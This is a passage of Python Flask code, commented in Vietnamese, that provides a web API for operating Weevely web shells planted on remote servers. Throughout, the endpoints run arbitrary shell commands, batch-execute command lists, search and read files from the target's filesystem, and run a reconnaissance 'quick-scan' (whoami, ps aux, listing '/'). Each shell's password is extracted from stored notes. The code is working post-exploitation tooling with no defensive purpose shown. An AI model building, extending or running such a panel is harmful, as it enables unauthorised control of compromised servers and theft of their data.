            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        commands = data.get('commands', [])
        delay = data.get('delay', 0.5)
        
        if not commands:
            return jsonify({'status': 'error', 'message': 'Commands required'}), 400
        
        result = executor.batch_execute(shell_conn.url, password, commands, delay)
        
        return jsonify({
            'status': 'success',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==========================================
# FILE OPERATIONS
# ==========================================

@blueprint.route('/<weevely_id>/file/find', methods=['POST'])
def file_find(weevely_id):
    """Tìm kiếm files"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        search_path = data.get('path', '/')
        pattern = data.get('pattern', '')
        file_type = data.get('file_type', 'f')
        vector = data.get('vector', 'sh_find')
        
        result = executor.file_find(shell_conn.url, password, search_path, pattern, file_type, vector)
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@blueprint.route('/<weevely_id>/file/read', methods=['POST'])
def file_read(weevely_id):
    """Đọc file"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        file_path = data.get('file_path')
        vector = data.get('vector', 'file_get_contents')
        encoding = data.get('encoding', 'utf-8')
        
        if not file_path:
            return jsonify({'status': 'error', 'message': 'File path required'}), 400
        
        result = executor.file_read(shell_conn.url, password, file_path, vector, encoding)
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==========================================
# SYSTEM OPERATIONS
# ==========================================

@blueprint.route('/<weevely_id>/system/info', methods=['GET'])
def system_info(weevely_id):
    """Lấy system info"""
    try:
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        result = executor.execute_module(shell_conn.url, password, ':system_info')
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@blueprint.route('/<weevely_id>/shell', methods=['POST'])
def shell_execute(weevely_id):
    """Thực thi shell command"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        command = data.get('command')
        if not command:
            return jsonify({'status': 'error', 'message': 'Command required'}), 400
        
        shell_cmd = f':shell_sh {command}'
        result = executor.execute_module(shell_conn.url, password, shell_cmd)
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==========================================
# UTILITY
# ==========================================

@blueprint.route('/modules', methods=['GET'])
def get_available_modules():
    """Lấy danh sách modules"""
    try:
        modules = executor.COMMON_MODULES
        vectors = executor.FILE_VECTORS
        
        return jsonify({
            'status': 'success',
            'data': {
                'modules': modules,
                'vectors': vectors
            }
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@blueprint.route('/<weevely_id>/quick-scan', methods=['POST'])
def quick_scan(weevely_id):
    """Quick scan with common commands"""
    try:
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        # Quick scan commands
        commands = [
            ':system_info',
            ':shell_sh whoami',
            ':shell_sh pwd',
            ':file_ls /',
            ':shell_sh ps aux | head -10'
        ]
        
        result = executor.batch_execute(shell_conn.url, password, commands, delay=0.3)
        
        return jsonify({
            'status': 'success',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500